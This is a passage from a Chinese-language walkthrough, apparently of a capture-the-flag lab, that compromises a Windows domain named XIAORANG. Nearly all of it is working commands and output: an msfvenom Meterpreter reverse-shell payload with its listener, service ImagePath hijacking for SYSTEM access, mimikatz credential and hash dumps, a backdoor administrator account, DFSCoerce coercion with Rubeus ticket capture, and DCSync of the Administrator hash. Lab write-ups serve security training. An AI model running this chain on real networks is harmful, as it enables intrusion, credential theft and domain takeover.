3495\n2024/07/24 09:23:48 client: Connecting to ws://139.*.*.*:1337\n2024/07/24 09:23:48 client: tun: proxy#7777=>7777: Listening\n2024/07/24 09:23:48 client: Connected (Latency 44.160355ms)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"msfvenom"})," \u751f\u6210\u8f7d\u8377"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.4.36 LPORT=7777 -f exe -o exploit-172.22.4.36-7777.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\nSaved as: exploit-172.22.4.36-7777.exe\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5f00\u542f\u76d1\u542c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@jmt-projekt:~# msfconsole -q\nThis copy of metasploit-framework is more than two weeks old.\n Consider running 'msfupdate' to update to the latest version.\nmsf6 > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set LHOST 0.0.0.0\nLHOST => 0.0.0.0\nmsf6 exploit(multi/handler) > set LPORT 7777\nLPORT => 7777\nmsf6 exploit(multi/handler) > exploit\n\n[*] Started reverse TCP handler on 0.0.0.0:7777\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c06\u8f7d\u8377\u6295\u653e\u5230\u9776\u673a\u4e4b\u540e\uff0c\u4fee\u6539\u670d\u52a1"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'PS C:\\Users\\Adrian> reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\gupdate\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\gupdate\n    Type    REG_DWORD    0x10\n    Start    REG_DWORD    0x2\n    ErrorControl    REG_DWORD    0x1\n    ImagePath    REG_EXPAND_SZ    "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe" /svc\n    DisplayName    REG_SZ    Google \u66f4\u65b0\u670d\u52a1 (gupdate)\n    DependOnService    REG_MULTI_SZ    RPCSS\n    WOW64    REG_DWORD    0x14c\n    ObjectName    REG_SZ    LocalSystem\n    Description    REG_SZ    \u8bf7\u786e\u4fdd\u4f7f\u7528\u6700\u65b0\u7248\u7684 Google \u8f6f\u4ef6\u3002\u5982\u679c\u505c\u7528\u6216\u4e2d\u65ad\u6b64\u670d\u52a1\uff0c\u5219\u60a8\u7684 Google \u8f6f\u4ef6\u5c31\u65e0\u6cd5\u53ca\u65f6\u66f4\u65b0\uff0c\u8fd9 \u610f\u5473\u7740\u65e0\u6cd5\u4fee\u590d\u6f5c\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u540c\u65f6\u67d0\u4e9b\u529f\u80fd\u4e5f\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55 Google \u8f6f\u4ef6\u4f7f\u7528\u6b64\u670d\u52a1\uff0c\u5219\u6b64\u670d\u52a1\u4f1a\u81ea\u884c\u5378\u8f7d\u3002\n    DelayedAutostart    REG_DWORD    0x1\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\gupdate\\Security\n\nPS C:\\Users\\Adrian> reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\gupdate /v ImagePath /t REG_EXPAND_SZ /d  C:\\Users\\Adrian\\Desktop\\exploit-172.22.4.36-7777.exe\n\u503c ImagePath \u5df2\u5b58\u5728\uff0c\u8981\u8986\u76d6\u5417 (Yes/No)? yes\n\u64cd\u4f5c\u6210\u529f\u5b8c\u6210\u3002\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u7136\u540e\u5728 ",(0,s.jsx)(n.code,{children:"cmd"})," \u4e2d\u542f\u52a8\u670d\u52a1"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"sc start gupdate\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u6536\u5230\u56de\u8fde\u7684 Meterpreter \u4f1a\u8bdd"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"msf6 exploit(multi/handler) > exploit\n\n[*] Started reverse TCP handler on 0.0.0.0:7777\n[*] Sending stage (200774 bytes) to 127.0.0.1\n[*] Meterpreter session 2 opened (127.0.0.1:7777 -> 127.0.0.1:52672) at 2024-07-24 09:31:38 +0800\n\nmeterpreter >\n[*] 127.0.0.1 - Meterpreter session 2 closed.  Reason: Died\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u91cc\u7684 ",(0,s.jsx)(n.code,{children:"Reason: Died"})," \u662f\u7531\u4e8e\u4f1a\u8bdd\u56e0\u670d\u52a1\u505c\u6b62\u800c\u81ea\u52a8\u6740\u6b7b\uff0c\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0c\u53ef\u4ee5\u5728 Meterpreter \u4f1a\u8bdd\u5efa\u7acb\u4e4b\u65f6\u53ca\u65f6\u8fdb\u884c\u8fdb\u7a0b\u8fc1\u79fb"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"msf6 exploit(multi/handler) > exploit\n\n[*] Started reverse TCP handler on 0.0.0.0:7777\n[*] Sending stage (200774 bytes) to 127.0.0.1\n[*] Meterpreter session 4 opened (127.0.0.1:7777 -> 127.0.0.1:42678) at 2024-07-24 09:36:24 +0800\n\nmeterpreter > ps\n\nProcess List\n============\n\n PID   PPID  Name                          Arch  Session  User                          Path\n ---   ----  ----                          ----  -------  ----                          ----\n 0     0     [System Process]\n 4     0     System                        x64   0\n 60    564   svchost.exe                   x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 84    4     Registry                      x64   0\n 164   564   svchost.exe                   x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 248   4     smss.exe                      x64   0\n 288   564   svchost.exe                   x64   0\n 352   344   csrss.exe                     x64   0\n 428   344   wininit.exe                   x64   0\n 444   420   csrss.exe                     x64   1\n ......\n 5924  564   svchost.exe                   x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 6036  564   svchost.exe                   x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n\nmeterpreter > migrate 6036\n[*] Migrating from 5768 to 6036...\n[*] Migration completed successfully.\n\nmeterpreter > sysinfo\nComputer        : WIN19\nOS              : Windows Server 2019 (10.0 Build 17763).\nArchitecture    : x64\nSystem Language : zh_CN\nDomain          : XIAORANG\nLogged On Users : 10\nMeterpreter     : x64/windows\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5e76\u4e14\u53d1\u73b0 ",(0,s.jsx)(n.code,{children:"C:\\Users\\Administrator\\flag\\flag02.txt"})," \u6587\u4ef6"]}),"\n",(0,s.jsx)(n.h2,{id:"flag---02",children:"flag - 02"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:" ________  _______   ___       _______   ________  ________  _________  ___  ________  ________\n|\\   ___ \\|\\  ___ \\ |\\  \\     |\\  ___ \\ |\\   ____\\|\\   __  \\|\\___   ___\\\\  \\|\\   __  \\|\\   ___  \\\n\\ \\  \\_|\\ \\ \\   __/|\\ \\  \\    \\ \\   __/|\\ \\  \\___|\\ \\  \\|\\  \\|___ \\  \\_\\ \\  \\ \\  \\|\\  \\ \\  \\\\ \\  \\\n \\ \\  \\ \\\\ \\ \\  \\_|/_\\ \\  \\    \\ \\  \\_|/_\\ \\  \\  __\\ \\   __  \\   \\ \\  \\ \\ \\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\\n  \\ \\  \\_\\\\ \\ \\  \\_|\\ \\ \\  \\____\\ \\  \\_|\\ \\ \\  \\|\\  \\ \\  \\ \\  \\   \\ \\  \\ \\ \\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\\n   \\ \\_______\\ \\_______\\ \\_______\\ \\_______\\ \\_______\\ \\__\\ \\__\\   \\ \\__\\ \\ \\__\\ \\_______\\ \\__\\\\ \\__\\\n    \\|_______|\\|_______|\\|_______|\\|_______|\\|_______|\\|__|\\|__|    \\|__|  \\|__|\\|_______|\\|__| \\|__|\n\n\nflag02: flag{8012e1e3-a8e1-4d81-81a1-08cb05b91dd6}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"17222445-xiaorangwin19-\u6293\u53d6\u57df\u5185\u4fe1\u606f",children:"172.22.4.45 XIAORANG\\WIN19 \u6293\u53d6\u57df\u5185\u4fe1\u606f"}),"\n",(0,s.jsxs)(n.p,{children:["\u52a0\u8f7d ",(0,s.jsx)(n.code,{children:"mimikatz"})," \u6a21\u5757"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"meterpreter > load kiwi\nLoading extension kiwi...\n  .#####.   mimikatz 2.2.0 20191125 (x64/windows)\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'        Vincent LE TOUX            (vincent.letoux@gmail.com)\n  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/\n\nSuccess.\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u83b7\u53d6\u6240\u6709\u51ed\u636e"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"meterpreter > creds_all\n[+] Running as SYSTEM\n[*] Retrieving all credentials\nmsv credentials\n===============\n\nUsername  Domain    NTLM                              SHA1\n--------  ------    ----                              ----\nAdrian    WIN19     3008c87294511142799dca1191e69a0f  b7bc3a1b04d9e165c6762b0a1cde5226df5b6a6a\nWIN19$    XIAORANG  22efd36d08f27afdf0628d9ba2bff827  01fdaaa6a61872baf4abcd2014135d01cc3ed463\nWIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b76399d26f39b8f8\n\nwdigest credentials\n===================\n\nUsername  Domain    Password\n--------  ------    --------\n(null)    (null)    (null)\nAdrian    WIN19     (null)\nWIN19$    XIAORANG  (null)\n\nkerberos credentials\n====================\n\nUsername  Domain        Password\n--------  ------        --------\n(null)    (null)        (null)\nAdrian    WIN19         (null)\nWIN19$    xiaorang.lab  62 99 91 1f f6 48 22 37 9c 72 d0 6b e6 f2 49 4f 35 c3 30 10 83 66 2c d0 07 02 15 1b 48 f2 22 be 40 7f 4e a2 f8 6a e0 2e a7 aa cc e2 58 c1 0c 6d 25 ad 40 61 cf 7b f8 1a e8 c0 ec 9b a7\n                         85 e3 f0 f5 ed 73 b0 2e 7b cd 70 b8 ad b6 03 57 d7 56 cc fd f0 9b c2 f7 71 81 dc 05 54 dc 92 1b 9b 4e 90 fa 6a 7e 7a ea eb 56 29 cf 8d 19 79 a6 13 5a cc e2 fa 6d 69 85 bf 2e bb e9 b\n                        3 3b 7e af e3 11 d6 9e 5d 1f 8d 67 0b a8 4e eb f4 c1 c9 1f 29 0f 22 51 25 cc a9 ee 57 14 a9 8e bf 90 35 89 0f fb fb 41 f1 e7 07 da f0 18 50 6f e8 61 28 05 91 63 a1 bd d8 20 27 04 89\n                        00 a8 65 14 8f 7b e5 5e 9a a5 f9 08 da 01 d3 8d de 7b be 6d bd 46 68 6a 79 6d 17 93 72 4b f2 01 29 9f 48 61 2c a9 c8 dc 02 67 4e 50 cf 64 eb 2b 5f 83 4d 85 93 95 0c f4 ba 8d\nWIN19$    xiaorang.lab  3a 94 de 4d 87 8e 7d 46 88 ec 9c 70 fd f0 c5 3e 4c f3 ce 6a 80 79 46 c6 2f f9 52 9b 4e 1d 90 58 52 2a 4e ac bf 05 09 08 06 0c 4b a9 a2 aa a2 9d db 0d f8 09 82 c0 6e f4 1b 81 93 59 67\n                         54 de 17 82 d7 c3 82 c5 38 13 4f d0 55 98 f6 a2 cc e7 cb 85 84 35 8a 0c 2e 9f d1 90 0c 0f c1 ea 0d d9 c5 d9 7f 29 a3 57 46 6b bf a4 b9 73 9a 80 84 1d df 3f 33 f5 16 e4 ee 2e d3 88 9\n                        2 cd a5 6e ac e3 eb 71 43 ed 7c b8 a2 9e 52 d5 31 1c 50 9b c8 71 03 e1 8e 4f 60 53 84 13 19 02 e2 8d 92 3f dc 0b 38 2c 13 c1 0e 6b 64 a7 fc 7a 2a a5 0e e0 b0 66 a9 a0 2f 8d 8d 40 f8\n                        72 d3 36 d3 3a a9 0d 3f b9 00 ef 3e 90 d9 36 a2 ad 36 2a 22 cd a0 cc 5b f4 0e a4 6b d3 24 8e 6e 99 59 96 d9 f8 a7 26 09 58 0a c2 3a 69 56 76 40 b9 10 92 a7 5c aa 3d e1 d0 1f\nwin19$    XIAORANG.LAB  62 99 91 1f f6 48 22 37 9c 72 d0 6b e6 f2 49 4f 35 c3 30 10 83 66 2c d0 07 02 15 1b 48 f2 22 be 40 7f 4e a2 f8 6a e0 2e a7 aa cc e2 58 c1 0c 6d 25 ad 40 61 cf 7b f8 1a e8 c0 ec 9b a7\n                         85 e3 f0 f5 ed 73 b0 2e 7b cd 70 b8 ad b6 03 57 d7 56 cc fd f0 9b c2 f7 71 81 dc 05 54 dc 92 1b 9b 4e 90 fa 6a 7e 7a ea eb 56 29 cf 8d 19 79 a6 13 5a cc e2 fa 6d 69 85 bf 2e bb e9 b\n                        3 3b 7e af e3 11 d6 9e 5d 1f 8d 67 0b a8 4e eb f4 c1 c9 1f 29 0f 22 51 25 cc a9 ee 57 14 a9 8e bf 90 35 89 0f fb fb 41 f1 e7 07 da f0 18 50 6f e8 61 28 05 91 63 a1 bd d8 20 27 04 89\n                        00 a8 65 14 8f 7b e5 5e 9a a5 f9 08 da 01 d3 8d de 7b be 6d bd 46 68 6a 79 6d 17 93 72 4b f2 01 29 9f 48 61 2c a9 c8 dc 02 67 4e 50 cf 64 eb 2b 5f 83 4d 85 93 95 0c f4 ba 8d\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u540c\u65f6\u83b7\u53d6\u7528\u6237\u7684\u54c8\u5e0c\u4fe1\u606f"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"meterpreter > hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::\nAdrian:1003:aad3b435b51404eeaad3b435b51404ee:3008c87294511142799dca1191e69a0f:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,s.jsx)(n.a,{href:"https://github.com/lzzbb/Adinfo",children:"lzzbb/Adinfo: \u57df\u4fe1\u606f\u6536\u96c6\u5de5\u5177"})," \u8fdb\u4e00\u6b65\u6293\u53d6\u57df\u5185\u4fe1\u606f"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"PS C:\\Users\\Adrian\\Desktop> .\\Adinfo_win.exe -d xiaorang.lab --dc 172.22.4.7 -u WIN19$ -H 22efd36d08f27afdf0628d9ba2bff827\n\n           _____  _        __\n     /\\   |  __ \\(_)      / _|\n    /  \\  | |  | |_ _ __ | |_ ___\n   / /\\ \\ | |  | | | '_ \\|  _/ _ \\     Tools that collect information from domain\n  / ____ \\| |__| | | | | | || (_) |\n /_/    \\_\\_____/|_|_| |_|_| \\___/     v1.5 by lzz\n\n[i] Try to connect '172.22.4.7'\n[c] Auth Domain: xiaorang.lab\n[c] Auth user: WIN19$\n[c] Auth hash: 22efd36d08f27afdf0628d9ba2bff827\n[c] connected successfully,try to dump domain info\n[i] DomainVersion found!\n                    [+] Windows 2016 Server operating system\n[i] Domain SID:\n                    [+] S-1-5-21-1913786442-1328635469-1954894845\n[i] Domain MAQ found\n                    [+] 10\n[i] Domain Account Policy found\n                    [+] pwdHistory: 24\n                    [+] minPwdLength: 7\n                    [+] minPwdAge: 1(day)\n                    [+] maxPwdAge: 42(day)\n                    [+] lockoutThreshold: 0\n                    [+] lockoutDuration: 30(min)\n[i] Domain Controllers: 1 found\n                    [+] DC01$  ==>>>   Windows Server 2016 Datacenter  [10.0 (14393)]  ==>>>  172.22.4.7\n[i] ADCS has not found!\n[i] Domain Exchange Server: 0 found\n[i] Domain All DNS:\n                    [+] Domain Dns 3 found,Saved in All_DNS.csv\n[i] Domain Trusts: 0 found\n[i] SPN: 39 found\n[i] Domain GPOs: 2 found\n[i] Domain Admins: 1 users found\n                    [+]Administrator\n[i] Enterprise Admins: 1 users found\n                    [+]Administrator\n[i] administrators: 1 users found\n                    [+]Administrator\n[i] Backup Operators: 0 users found\n[i] Users: 6 found\n[i] User with Mail: 0 found\n[i] Only_name_and_Useful_Users: 3 found\n[i] Only_admincount=1_andUseful_Users: 1 found\n[i] Locked Users: 0 found\n[i] Disabled Users: 3 found\n[i] Users with passwords not set to expire: 2 found\n[i] Domain Computers: 5 found\n[i] Only_name_and_Useful_computers: 5 found\n[i] Groups: 49 found\n[i] Domain OUs: 1 found\n[i] LAPS Not found\n[i] LAPS passwords: 0 found\n[i] SensitiveDelegate Users: 0 found\n[i] AsReproast Users: 0 found\n[i] Kerberoast Users: 1 found\n                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==>>>  kadmin/changepw\n[i] SIDHistory Users: 0 found\n[i] CreatorSID Users: 2 found\n                    [+] WIN-3X7U15C2XDM$  ==>>>  Marcus\n                    [+] WIN-YUUAW2QG9MF$  ==>>>  Marcus\n[i] RBCD Users: 0 found\n[i] Unconstrained Deligation Users: 1 found\n                    [+] WIN19$\n[i] Constrained Deligation Users: 0 found\n[i] Krbtgt password last set time: 2022-06-22 22:54:34 +0800 CST\n[i] CSVs written to 'csv' directory in C:\\Users\\Adrian\\Desktop\n[i] Execution took 1.0226163s\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u57df\u5185\u53d1\u73b0\u4e00\u4e2a\u975e\u7ea6\u675f\u59d4\u6d3e\uff0c\u5c1d\u8bd5\u5229\u7528"}),"\n",(0,s.jsx)(n.h2,{id:"17222445-xiaorangwin19-\u975e\u7ea6\u675f\u59d4\u6d3e",children:"172.22.4.45 XIAORANG\\WIN19 \u975e\u7ea6\u675f\u59d4\u6d3e"}),"\n",(0,s.jsx)(n.p,{children:"\u9996\u5148\uff0c\u521b\u5efa\u65b0\u7684\u7ba1\u7406\u5458\u8d26\u53f7"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"net user randark admin123 /add\nnet localgroup administrators randark /add\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u767b\u9646\u65b0\u7684\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u4e0a\u4f20 ",(0,s.jsx)(n.code,{children:"Rubeus.exe"})," \u8fdb\u884c\u7968\u636e\u6293\u53d6"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"PS C:\\Users\\randark\\Desktop> .\\Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.2.0\n\n[*] Action: TGT Monitoring\n[*] Target user     : DC01$\n[*] Monitoring every 1 seconds for new TGTs\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7528 ",(0,s.jsx)(n.code,{children:"dfscoerce"})," \u89e6\u53d1 RPC \u4f7f DC \u5411 WIN19 \u8ba4\u8bc1"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/pocs]\n\u2514\u2500$ proxychains4 python3 ./DFSCoerce/dfscoerce.py -u \"WIN19$\" -hashes :22efd36d08f27afdf0628d9ba2bff827 -d xiaorang.lab win19 172.22.4.7\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[-] Connecting to ncacn_np:172.22.4.7[\\PIPE\\netdfs]\n[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.4.7:445  ...  OK\n[+] Successfully bound!\n[-] Sending NetrDfsRemoveStdRoot!\nNetrDfsRemoveStdRoot\nServerName:                      'win19\\x00'\nRootShare:                       'test\\x00'\nApiFlags:                        1\n\n\nDFSNM SessionError: code: 0x490 - ERROR_NOT_FOUND - Element not found.\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6210\u529f\u76d1\u542c\u5230\u7968\u636e"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"[*] 2024/7/24 2:18:02 UTC - Found new TGT:\n\n  User                  :  DC01$@XIAORANG.LAB\n  StartTime             :  2024/7/24 8:15:17\n  EndTime               :  2024/7/24 18:15:17\n  RenewTill             :  2024/7/31 8:15:17\n  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable\n  Base64EncodedTicket   :\n\n    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD5aZsYI9Sw2W6J+rVNw+77PB+2CdipSyfMJuMYJuep25IVTVTASjwKCfMgBjw0UjoQHMrTZmXdiQD5RBKogFn3zkQgqUUSTHMkjtN5/97EcrNuobYOEYByCcJDJVNVFYpF4BHvOwT1oW9tfRNK8YGcKSwSTyIITkeLbukhwym5CbYgiy//zubFVQTkR31cokGPtkuPfBt5lI27xMKhxQ1Ij59EQHGoYOIJBrO2Lvc0UCD19aVHq2Qqf/dqaYwUZ2q/YhEnby/ws/dCfZlWpPJK/pgDErh9ibcsEABDvV8Rhm833Yc8jIPf8J8DKFKFAfl80ZnxRwTLTXIKR3fpj0kFWg3pSApolh4SY3PiW7k9X9fuK+4LI8TuH5ZK47MAafUMvByyGYZwJ3Yrar0m99ia9JLn3jrX6Qk4LpK3VJppuNlN+gwMC9/mYlGyjlXCBZgZCnalbgNUlRFdvqHZBettxrYugDGGYErhKWt/XtLPW4fvA2FkscK8wm0N1/o0GcdhD/Oy2f+Symu57vNZoQvUqoKVPlbt7ccF6V9BLQoGuIr831JrMDLXGdPChV+qBRe9ErHUKFTZb4o02Q22gxltkltpprYBNprl9mS9FWWycGDO7e6wYGrYTFxFaHwUL7U+TY3OiYucHTzUWh1cauxjYchJBZqI7oOe0MW9IdJ6OkFSK1IpGlPr0WgEpG5RBN1pYvap4H/zHzpR4DvUvJezoJNEZJ8050+3PujeDGV9RRQTkMema+LGyefR3yKe88yiJ+xu+dZI4GWfj96vlQ0wphmm8/ysUMUG9OOfwS8rk98qP0SplwsuCdyvXQxGZOOA9/RPeMgV0KBJwcociO2FRykFL7GVexVJ62Wtl/UY9WqCpBTr44A9gvR92si7gNJdIdHf1AvTSD3xlHOWqYC6E/sFBU6BMjmoFDycK9wmcr1qpg/n3Zm+EnsMb5LLEL3VlK413NadraLP+/mA1CtrQQgSCoWP5uGTwzD/4e64IqgVbt0QrZdQspmd9UsiIX97vxVrTY2Ca4UObnl0LSJc2gUVnP3qSm5J4AXEQRNzI+0m40KshstoIz1dsJp/YVcze+DLeH6HbkFqlTM8hUVok5M69guHXNtsavg2xnw/rjcU2/SyH8vnd4cQgbKirAb0BYt/sIS4wtiOtrbq0vr06c1L10xwkjfe4IC8pmCG6q9RADOn8n+SfFpXBkoSMFUyfqwf4DuS83703iBPG13ushLxWpDcDCxISd2uk8BlatFwNXGDL0IOJnESLseMvwX3Csw8+9PRDLWTIHrAr5a/Np/tZAT3yvh85XE26m6hLs7cGAFXH+m8cmkSws2lTDvERTgXm3uxojoe8sJh7PPBWaM0surxjtYL1JL+6RD6oH/S/2qmw/bFSIanrVM5dwCKblSkcKUKqMg8re4iQ74MqUY6dff2RGt5zldrqk6SjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAkzDKS0dyBbUs2LWRfrMMsic4a1ZchdPHkd73Kcqxn96EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI0MDcyNDAwMTUxN1qmERgPMjAyNDA3MjQxMDE1MTdapxEYDzIwMjQwNzMxMDAxNTE3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==\n\n[*] Ticket cache size: 1\n"})}),"\n",(0,s.jsx)(n.h2,{id:"17222445-xiaorangwin19-\u7968\u636e\u6587\u4ef6\u76f4\u63a5-dcsync",children:"172.22.4.45 XIAORANG\\WIN19 \u7968\u636e\u6587\u4ef6\u76f4\u63a5 DCSync"}),"\n",(0,s.jsxs)(n.p,{children:["\u5c06\u5f97\u5230\u7684\u7968\u636e\u6570\u636e Base64 \u89e3\u7801\u540e\uff0c\u50a8\u5b58\u4e3a ",(0,s.jsx)(n.code,{children:"DC01.kirbi"})," \u6587\u4ef6"]}),"\n",(0,s.jsxs)(n.p,{children:["\u7136\u540e\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"Mimikatz"})," \u8fdb\u884c DCSync"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"mimikatz(commandline) # kerberos::purge\nTicket(s) purge for current session is OK\n\nmimikatz(commandline) # kerberos::ptt DC01.kirbi\n\n* File: 'DC01.kirbi': OK\n\nmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /user:administrator\n[DC] 'xiaorang.lab' will be the domain\n[DC] 'DC01.xiaorang.lab' will be the DC server\n[DC] 'administrator' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : Administrator\n\n** SAM ACCOUNT **\n\nSAM Username         : Administrator\nAccount Type         : 30000000 (USER_OBJECT)\nUser Account Control : 00000200 (NORMAL_ACCOUNT)\nAccount expiration   : 1601/1/1 8:00:00\nPassword last change : 2024/7/24 8:15:12\nObject Security ID   : S-1-5-21-1913786442-1328635469-1954894845-500\nObject Relative ID   : 500\n\nCredentials:\n  Hash NTLM: 4889f6553239ace1f7c47fa2c619c252\n    ntlm- 0: 4889f6553239ace1f7c47fa2c619c252\n    ntlm- 1: 4889f6553239ace1f7c47fa2c619c252\n    ntlm- 2: 4889f6553239ace1f7c47fa2c619c252\n    ntlm- 3: 4889f6553239ace1f7c47fa2c619c252\n    lm  - 0: 813da4984a1e3939a735df91221e943b\n    lm  - 1: 5991588b4cc2724a4a3d17b161ad272f\n    lm  - 2: 61960a24667b36658ce18243e11a53af\n\nSupplemental Credentials:\n* Primary:NTLM-Strong-NTOWF *\n    Random Value : 23500bf302b53fbd2bd18700afa9046e\n\n* Primary:Kerberos-Newer-Keys *\n    Default Salt : XIAORANG.LABAdministrator\n    Default Iterations : 4096\n    Credentials\n      aes256_hmac       (4096) : 23b87fd9c4a80c58fb0d71e2a0d5fc82b7de27156d039ad791093aa88ca95eb3\n      aes128_hmac       (4096) : 3a4807b53f305c84603ff072655a5c42\n      des_cbc_md5       (4096) : 64feb058753bf1a2\n    OldCredentials\n      aes256_hmac       (4096) : 23b87fd9c4a80c58fb0d71e2a0d5fc82b7de27156d039ad791093aa88ca95eb3\n      aes128_hmac       (4096) : 3a4807b53f305c84603ff072655a5c42\n      des_cbc_md5       (4096) : 64feb058753bf1a2\n    OlderCredentials\n      aes256_hmac       (4096) : 23b87fd9c4a80c58fb0d71e2a0d5fc82b7de27156d039ad791093aa88ca95eb3\n      aes128_hmac       (4096) : 3a4807b53f305c84603ff072655a5c42\n      des_cbc_md5       (4096) : 64feb058753bf1a2\n\n* Primary:Kerberos *\n    Default Salt : XIAORANG.LABAdministrator\n    Credentials\n      des_cbc_md5       : 64feb058753bf1a2\n    OldCredentials\n      des_cbc_md5       : 64feb058753bf1a2\n\n* Packages *\n    NTLM-Strong-NTOWF\n\n* Primary:WDigest *\n    01  1fd4772b6f3fea5f0a5a234dde150efb\n    02  70b5ab2d5931d45749e4f10b80a70466\n    03  0d71e6115a7e5850b3e4c777aba623df\n    04  1fd4772b6f3fea5f0a5a234dde150efb\n    05  354a5ce3ca3629c6ca77a73b462c0a7f\n    06  a692fc773761b7edf3a3cad332053a85\n    07  3b3bf4f20b86e7f890d2a6f748684c86\n    08  